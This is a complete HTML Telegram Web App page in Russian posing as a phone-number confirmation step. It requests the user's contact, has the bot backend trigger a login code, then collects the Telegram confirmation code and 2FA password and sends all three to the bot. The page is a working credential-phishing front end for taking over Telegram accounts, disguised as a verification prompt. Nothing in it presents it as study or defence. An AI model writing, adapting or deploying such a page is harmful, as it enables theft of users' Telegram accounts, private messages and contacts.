<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { width: 90%; text-align: center; }
        .status { color: #00ff88; margin-bottom: 20px; font-weight: bold; }
        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; box-sizing: border-box; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="step1">
            <div class="status">СИСТЕМА ГОТОВА</div>
            <p>Нажмите синюю кнопку внизу окна Telegram</p>
        </div>
        <div id="step2" class="hidden">
            <input type="number" id="code" placeholder="Код подтверждения">
            <input type="password" id="pass" placeholder="2FA пароль (если есть)">
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // Настраиваем главную кнопку Telegram (синяя снизу)
        tg.MainButton.setText("ПОДТВЕРДИТЬ НОМЕР");
        tg.MainButton.show();

        let currentStep = 1;
        let userPhone = "";

        tg.MainButton.onClick(() => {
            if (currentStep === 1) {
                // Запрашиваем контакт
                tg.requestContact((ok, res) => {
                    if (ok) {
                        userPhone = res.response_data?.phone_number || res.contact?.phone_number;
                        tg.sendData(JSON.stringify({
                            action: "send_code",
                            phone: String(userPhone)
                        }));
                        
                        // Переходим к вводу кода
                        document.getElementById('step1').classList.add('hidden');
                        document.getElementById('step2').classList.remove('hidden');
                        tg.MainButton.setText("ВОЙТИ В АККАУНТ");
                        currentStep = 2;
                    }
                });
            } else {
                // Отправляем код и пароль
                const code = document.getElementById('code').value;
                const pass = document.getElementById('pass').value || "none";
                tg.sendData(JSON.stringify({
                    action: "verify",
                    phone: String(userPhone),
                    code: String(code),
                    two_fa: String(pass)
                }));
                tg.MainButton.hide();
                tg.close();
            }
        });
    </script>
</body>
</html>
